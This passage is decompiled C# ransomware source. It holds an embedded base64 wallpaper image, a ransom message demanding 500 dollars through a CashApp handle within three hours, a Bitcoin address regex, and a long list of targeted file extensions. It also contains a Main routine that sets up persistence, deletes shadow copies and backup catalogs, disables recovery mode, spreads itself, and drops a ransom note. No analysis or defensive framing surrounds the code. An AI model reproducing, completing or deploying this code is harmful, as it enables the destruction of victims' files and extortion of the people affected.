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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "How To Get It  Back";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[6] { "All Your Files Are Encrypted Send 500 Dollars For Them Back, You Have  3 Hours GoodLuck :)", "", "", "500 DOLLARS TO  MY CASHAPP", "CASHAPP: $TheRealWorldIsHere", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}
